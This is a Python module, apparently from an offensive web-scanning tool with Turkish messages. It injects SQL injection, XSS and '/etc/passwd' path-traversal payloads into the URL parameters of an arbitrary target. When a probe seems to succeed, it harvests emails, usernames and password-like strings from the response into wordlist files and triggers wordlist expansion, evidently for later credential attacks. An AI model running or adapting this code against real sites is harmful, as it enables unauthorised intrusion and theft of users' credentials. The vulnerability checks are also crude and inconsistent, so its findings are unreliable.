import requests
from urllib.parse import parse_qs
from modules.utils.logger import log_error, log_info, log_warning
from colorama import Fore, Style
import re
import os
from modules.wordlist_expander import expand_wordlists_from_data

def extract_and_update_wordlists(response_text):
    emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", response_text)
    usernames = re.findall(r"\b[a-zA-Z]{3,20}\b", response_text)
    passwords = re.findall(r"\b[\w@#$%^&*!]{6,20}\b", response_text)

    def add_to_file(filename, items):
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        if not os.path.exists(filename):
            open(filename, "w").close()
        with open(filename, "r") as f:
            existing = set(line.strip() for line in f)
        new_items = set(items) - existing
        if new_items:
            with open(filename, "a") as f:
                for item in new_items:
                    f.write(item + "\n")
            print(f"[+] {filename} dosyasına {len(new_items)} yeni öğe eklendi.")

    usernames = [u for u in usernames if u not in emails]

    add_to_file("data/username.txt", usernames)
    add_to_file("data/password.txt", passwords)
    add_to_file("data/emails.txt", emails)

    # Otomatik kelime listesi çoğaltmayı tetikle
    expand_wordlists_from_data()

# Test edilecek payload listesi
test_payloads = [
    "'", "'--", "\"", "\"--",
    "<script>alert(1)</script>",
    "../../../../etc/passwd"
]

def print_colored(msg, color=Fore.WHITE):
    print(f"{color}{msg}{Style.RESET_ALL}")

def is_vulnerable(response_text, payload_type):
    text = response_text.lower()

    if payload_type == "SQL" and ("syntax" in text or "mysql" in text):
        return True
    if payload_type == "XSS" and "alert(1)" in response_text:
        return True
    if payload_type == "LFI" and ("root:" in text or "bin/bash" in text):
        return True

    return False

def scan(url):
    log_info(f"Zafiyet taraması başlatılıyor: {url}")

    if "?" not in url:
        log_error("URL parametre içermiyor. Test edilemez.")
        return False

    try:
        base, query = url.split("?", 1)
        params = parse_qs(query)

        for param in params:
            for payload in test_payloads:
                test_url = f"{base}?{param}={payload}"
                print_colored(f"[🧪] Test ediliyor: {test_url}", Fore.CYAN)

                try:
                    r = requests.get(test_url, timeout=5)

                    if is_vulnerable(r.text, "SQL"):
                        log_warning(f"Olası SQL açığı bulundu: {test_url}")
                        extract_and_update_wordlists(r.text)
                        return True, r.text

                    if is_vulnerable(r.text, "XSS"):
                        log_warning(f"Olası XSS açığı bulundu: {test_url}")
                        extract_and_update_wordlists(r.text)
                        return True, r.text

                    if is_vulnerable(r.text, "LFI"):
                        log_warning(f"Olası LFI açığı bulundu: {test_url}")
                        extract_and_update_wordlists(r.text)
                        return True, r.text

                except requests.exceptions.RequestException as req_err:
                    log_error(f"İstek hatası: {test_url}", req_err)

    except Exception as e:
        log_error("Tarama sırasında genel hata oluştu.", e)

    log_info("Zafiyet bulunamadı.")
    return False
